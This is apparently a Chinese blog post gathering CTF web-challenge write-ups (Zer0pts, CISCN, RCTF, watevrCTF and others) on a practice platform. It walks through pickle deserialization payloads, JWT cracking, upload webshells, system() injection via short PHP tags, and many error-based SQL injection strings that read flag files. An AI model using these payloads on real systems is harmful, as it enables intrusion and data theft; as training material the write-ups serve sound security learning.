@[TOC]


# [Zer0pts2020]Can you guess it?
>[参考博客](https://www.cnblogs.com/yesec/p/15429527.html)

![在这里插入图片描述](https://img-blog.csdnimg.cn/22b1ddc90a3740a2be4995e0b9ac3eef.png)
界面源码没有东西，点Source看看

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>

```

`preg_match`正则匹配，结尾用不可见字符绕过

要从`config.php`读`flag`，`$_SERVER['PHP_SELF']`表示的就是当前访问的`php`页面
>当我们传入index.php/config.php时，仍然请求的是index.php，但是当basename()处理后，highlight_file()得到的参数就变成了config.php，从而我们就实现了任意文件包含。

`/index.php/config.php/啊?source`


====================================================
# [CISCN2019 华北赛区 Day1 Web2]ikun
>[CISCN2019 华北赛区 Day1 Web2ikun](https://www.cnblogs.com/Cl0ud/p/12177062.html)

先找有'lv6.png'的页面，查源码可以看到图片的命名方式

```python
import requests

url="http://e2a346a8-9df8-4038-9c92-2bdb2a343420.node4.buuoj.cn:81/shop?page=";

for i in range(0,1000):
    res=requests.get(url+str(i))

    if('lv6.png' in res.text):
        print("findstr"+str(i))
        break

#findstr180
```

购买`lv6`并加入折扣
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba714f20662f41a18d0253ceaa609687.png)
有页面跳转，访问之

![在这里插入图片描述](https://img-blog.csdnimg.cn/cff496c5cf814b0e8771dae38933ebe8.png)
在cookie中发现`jwt`，尝试进行爆破、伪造

`jwt-cracker`

`jwtcracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjExMSJ9.5hqClCrHxXTMD2pR9wgK4Kjt8Quuy1puPM4MamgHLOg`

![在这里插入图片描述](https://img-blog.csdnimg.cn/0ccd10052ca5432383bc310d5d9d8f90.png)
网站`https://jwt.io/`进行修改放包

![在这里插入图片描述](https://img-blog.csdnimg.cn/17b0e2a3e76747519d10e3e043b68a43.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/c25fc9197cbe44c48cf4ee432dcf73dc.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/f93f506cb08649e1ba57abb28d82c6a1.png)
在`Admin.py`中有反序列化内容

![在这里插入图片描述](https://img-blog.csdnimg.cn/31ebb0e70bcc4af08146368d63839534.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/1da46462216d4b1fbba24c12239793e0.png)
```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```

生成

`c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
`

点击`b1g_m4mber`中的一键成为大会员，将`admin`改为上述值即可


# [GWCTF 2019]枯燥的抽奖
>https://blog.csdn.net/qq_61778128/article/details/127113502
>https://www.cnblogs.com/Article-kelp/p/16046948.html

发现数据传到check.php，访问发现源码，考察伪随机数
需要根据已经有的前半部分字符串，利用php_mt_seed跑出伪随机数种子，再生成这个完整的字符串

```php
<?php
error_reporting(0);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$string='NTxNCNzpql';
$len1=10;
for ( $i = 0; $i < $len1; $i++ ){
$pos=strpos($str_long1,$string[$i]);
    echo $pos." ".$pos." 0 61 " ;  
}
?>
```

```shell
49 49 0 61 55 55 0 61 23 23 0 61 49 49 0 61 38 38 0 61 49 49 0 61 25 25 0 61 15 15 0 61 16 16 0 61 11 11 0 61
```

linux下用php_mt_seed-main工具，先make

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f46ab048dc84583824f08430812b877.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ff9fa057cfd45ce845df0362bd551f7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c3d5876017c34ca88813c1d462ca48f6.png)

# [WUSTCTF2020]CV Maker

注册账号，然后登陆
![在这里插入图片描述](https://img-blog.csdnimg.cn/fb1adf384a094238b4dc02e723a5a1e4.png)
上传图片，抓包，改后缀，加一句话
![在这里插入图片描述](https://img-blog.csdnimg.cn/9eaa117d5ddd4b588f86e107ea53ea93.png)
找到路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/3983511067de4481a03e0ed298b359b8.png)
打开，连shell，根目录下找flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/4412404085f74b17a35a861b9b700f0f.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/1b71d8f599ba4b2bacb374cb68c58b60.png)
# [NCTF2019]True XML cookbook



# [RCTF2015]EasySQL

二次注入，登录处注入没用，选文章那尝试了文件包含没用

![在这里插入图片描述](https://img-blog.csdnimg.cn/55a7388f976b410390344ab7c7877ef2.png)
有改密码功能，所以能显示，尝试二次
![在这里插入图片描述](https://img-blog.csdnimg.cn/1a99d33509d54274a1c60c1e32b86b55.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c233cf3b4ce45689b1b3c1b743dde62.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/325ee26911c743cea91288c4e748605e.png)
双引号闭合，故构造语句(有空格过滤)
`aaa“||updatexml(1,concat(0x7e,database(),0x7e),1)#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/4ac606bf82934f4f8961167ea4f29e6c.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2a0ba0c9e7cd42c8bff9cc729c41eab7.png)
查一下表名
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/17ae517ddfbd41cd8ab321b33aaabf03.png)
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/3ebb158a0ee245bebca7e3438b7227d5.png)
`aaa"||updatexml(1,concat(0x7e,(select(flag)from(web_sqli.flag)),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/d1f8916a8ffc48ba9787eff6a2570351.png)
看看users表有无flag
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/adcfa8860880497f82301d8dd7cff01b.png)
盲猜没显示全，right、left不能用，换regexp()
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r')),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/e9970f0d8fbe4400a8c31afcac46e143.png)


查一下flag
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/268e0ec59c3b438fb05a3ed0ec4ca3d3.png)
一堆杂结果，正则匹配内容
`aaa"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^flag')),0x7e),1)#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/7c93c71db7224370baa011cb3a90c202.png)
`aaa"||updatexml(1,concat(0x7e,(reverse(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('9578'))),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/bfe14496bb09487fadd51154337e44e7.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a86f8e23a6ab406a814f9003217de7f7.png)
flag{d9887829-d110-4cec-9578-970715946271}

# [CISCN2019 华北赛区 Day1 Web1]Dropbox
[参考博客](https://blog.csdn.net/weixin_44077544/article/details/102844554)


# [CISCN2019 华北赛区 Day1 Web5]CyberPunk
index.php查看源码有文件包含?file=xxxx

伪协议读源码

change.php
```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>

```
对username有过滤，但是对address没有过滤，在confirm中对地址没有过滤便进行插入
`"' and updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,32)),0x7e),1)#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/c041c8543aff4307b35e94ad21c36f50.png)
`"' and updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,32)),0x7e),1)#`


# [红明谷CTF 2021]write_shell
代码审计发现是向某个随机生成的目录index.php写内容，先action=pwd获取自己的目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/0a92c4964bee446e8cb6f3d014692afb.png)
然后尝试短标签`<?=system("ls")?>`
![在这里插入图片描述](https://img-blog.csdnimg.cn/7c2acb0e181e4129a209b307f716953d.png)
空格`%09`绕过查看根目录`?action=upload&data=<?=system("ls%09/")?>`
![在这里插入图片描述](https://img-blog.csdnimg.cn/825de783a386459baa21ffb0f602d66c.png)
查flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/e195ce51056e4ad9a77b653da1218973.png)

#  [watevrCTF-2019]Cookie Store

f12 network发现有一个302跳转buy页面，直接访问无果

![在这里插入图片描述](https://img-blog.csdnimg.cn/e7959815225741d586225049bf8ae75f.png)

抓包发现302重设了cookie
![在这里插入图片描述](https://img-blog.csdnimg.cn/613c507517914dc7a77c59f2400e3246.png)
base64解码看到json字符串
![在这里插入图片描述](https://img-blog.csdnimg.cn/08ac2f0d4bae479b96b33aca826cd01b.png)
尝试改金额放到cookie里
![在这里插入图片描述](https://img-blog.csdnimg.cn/64032211635b4ba08117840726e3686e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/7575b1aa9c4244d1b04431eb2878cd35.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c376fca073da464cb013a09b18051cba.png)
# [网鼎杯 2020 白虎组]PicDown
文件包含任意文件下载
![在这里插入图片描述](https://img-blog.csdnimg.cn/2490d04ce1ee48baac7eba48adb1abd7.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3c7096a3dbe043f0be3afef8da780c89.png)
尝试/etc/passwd下载到beautiful.jpg里
尝试php://filter伪协议读源码无果
直接尝试/flag下载

看别的师傅的wp发现这道题本意并非如此
[参考博客](https://blog.csdn.net/rfrder/article/details/112310943)

/proc/self/cmdline  获取进程启动命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/c808aea6ae39423eaaa6f0dc93be7c87.png)
读/proc/self/cwd/app.py也就是当前运行程序环境下的app.py
```python

from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

```

需要知道密钥，然后可以执行系统命令
密钥从`/proc/self/fd/{id}`中找![在这里插入图片描述](https://img-blog.csdnimg.cn/288f1a4136b34b1c965d688c0828cd43.png)


